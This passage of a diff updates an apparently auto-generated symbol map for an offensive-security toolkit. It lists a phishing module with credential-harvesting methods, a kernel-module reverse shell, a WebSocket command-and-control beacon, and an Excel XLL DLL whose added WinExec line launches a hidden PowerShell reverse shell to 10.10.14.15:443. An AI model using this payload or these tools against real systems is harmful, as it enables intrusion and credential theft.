+  - `record_click` (method, line 584) `def record_click(self, campaign_id, email)`
+  - `record_credentials` (method, line 605) `def record_credentials(self, campaign_id, email, password)`
+  - `_load_targets_from_file` (method, line 644) `def _load_targets_from_file(self, filepath)`
+  - `_generate_landing_page` (method, line 683) `def _generate_landing_page(self, template, target_domain, campaign_id)`
+  - `_setup_harvesting_endpoint` (method, line 723) `def _setup_harvesting_endpoint(self, campaign_id)`
+  - `_send_email` (method, line 735) `def _send_email(self, to_email, subject, html_body, smtp_config)`
+  - `_inject_harvester` (method, line 769) `def _inject_harvester(self, html, page_id)`
+  - `_load_config` (method, line 808) `def _load_config(self)`
 - Depends on: `core/crypto.py`, `core/hardening.py`
 - Imported by: `cli/commands/phishing_wizard.py`, `cli/commands/phishing_wizard.py`, `mutants/tests/test_security_hardening_v3.py`, `mutants/tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v3.py`, `tests/test_security_hardening_v5.py`
 
@@ -3525,7 +3592,7 @@
   - `load` (method, line 587) `def load(self, path)`
   - `result_summary` (method, line 614) `def result_summary(self, result)`
   - `_local_executor` (method, line 701) `def _local_executor(command, host)`
-- Depends on: `core/logging.py`, `modules/llm_client.py`, `modules/obs_parser.py`, `modules/world_model.py`
+- Depends on: `core/logging.py`, `core/safe_exec.py`, `modules/llm_client.py`, `modules/obs_parser.py`, `modules/world_model.py`
 - Imported by: `cli/commands/caldera.py`, `cli/commands/mcp_bridge.py`, `modules/operation.py`, `modules/planner.py`, `mutants/tests/test_core_modules.py`, `mutants/tests/test_core_modules.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp.py`, `tests/test_core_modules.py`, `tests/test_core_modules.py`
 
 ## modules/playbook_executor.py
@@ -3789,6 +3856,9 @@
 - Symbols:
   - `reverse_shell_init` (function, line 12) `static int __init reverse_shell_init(void)`
   - `reverse_shell_exit` (function, line 15) `static void __exit reverse_shell_exit(void)`
+  - `call_usermodehelper` (function, line 13) `return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);`
+  - `printk` (function, line 17) `printk(KERN_INFO "Exiting\n");`
+  - `module_init` (function, line 19) `module_init(reverse_shell_init);`
 
 ## modules/revshell.c
 - Layer: utility
@@ -3797,6 +3867,8 @@
 - Symbols:
   - `xlAutoOpen` (function, line 4) `void __cdecl xlAutoOpen()`
   - `DllMain` (function, line 9) `BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)`
+  - `__declspec` (function, line 2) `__declspec(dllexport) void __cdecl xlAutoOpen(void);`
+  - `WinExec` (function, line 7) `WinExec("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.15', 443);`
 
 ## modules/rich_tui.py
 - Layer: presentation
@@ -4481,27 +4553,27 @@
 - Layer: utility
 - Language: py
 - Symbols:
-  - `WebSocketBeacon` (class, line 43) `class WebSocketBeacon`
-  - `WebSocketC2Handler` (class, line 253) `class WebSocketC2Handler`
-  - `__init__` (method, line 59) `def __init__(self, server_url, beacon_id, encryption_key, sleep_seconds, jitter_percent, ssl_verify, proxy)`
-  - `_encrypt` (method, line 88) `def _encrypt(self, data)`
-  - `_decrypt` (method, line 94) `def _decrypt(self, data)`
-  - `_build_message` (method, line 100) `def _build_message(self, msg_type, payload)`
-  - `_jittered_sleep` (method, line 111) `def _jittered_sleep(self)`
-  - `connect` (method, line 118) `def connect(self)`
-  - `check_in` (method, line 148) `def check_in(self)`
-  - `send_result` (method, line 177) `def send_result(self, task_id, output, exit_code)`
-  - `run` (method, line 195) `def run(self, command_handler)`
-  - `shutdown` (method, line 242) `def shutdown(self)`
-  - `__init__` (method, line 267) `def __init__(self, host, port, ssl_context, beacon_callback, task_callback, result_callback)`
-  - `_handle_connection` (method, line 289) `def _handle_connection(self, websocket, path)`
-  - `start` (method, line 353) `def start(self)`
-  - `stop` (method, line 363) `def stop(self)`
-  - `start_in_thread` (method, line 370) `def start_in_thread(self)`
-  - `_run_loop` (method, line 381) `def _run_loop(self, loop)`
-  - `send_task` (method, line 387) `def send_task(self, beacon_id, command)`
-  - `list_beacons` (method, line 416) `def list_beacons(self)`
-  - `remove_stale_beacons` (method, line 433) `def remove_stale_beacons(self, timeout)`
+  - `WebSocketBeacon` (class, line 46) `class WebSocketBeacon`
+  - `WebSocketC2Handler` (class, line 274) `class WebSocketC2Handler`
+  - `__init__` (method, line 62) `def __init__(self, server_url, beacon_id, encryption_key, sleep_seconds, jitter_percent, ssl_verify, proxy)`
+  - `_encrypt` (method, line 91) `def _encrypt(self, data)`
+  - `_decrypt` (method, line 97) `def _decrypt(self, data)`
+  - `_build_message` (method, line 103) `def _build_message(self, msg_type, payload)`
+  - `_jittered_sleep` (method, line 114) `def _jittered_sleep(self)`
+  - `connect` (method, line 122) `def connect(self)`
+  - `check_in` (method, line 157) `def check_in(self)`
+  - `send_result` (method, line 191) `def send_result(self, task_id, output, exit_code)`
+  - `run` (method, line 214) `def run(self, command_handler)`
+  - `shutdown` (method, line 263) `def shutdown(self)`
+  - `__init__` (method, line 288) `def __init__(self, host, port, ssl_context, beacon_callback, task_callback, result_callback)`
+  - `_handle_connection` (method, line 310) `def _handle_connection(self, websocket, path)`
+  - `start` (method, line 382) `def start(self)`
+  - `stop` (method, line 392) `def stop(self)`
+  - `start_in_thread` (method, line 399) `def start_in_thread(self)`
+  - `_run_loop` (method, line 410) `def _run_loop(self, loop)`
+  - `send_task` (method, line 416) `def send_task(self, beacon_id, command)`
+  - `list_beacons` (method, line 447) `def list_beacons(self)`
+  - `remove_stale_beacons` (method, line 464) `def remove_stale_beacons(self, timeout)`
 - Depends on: `core/hardening.py`
 
 ## modules/wineconfig.sh
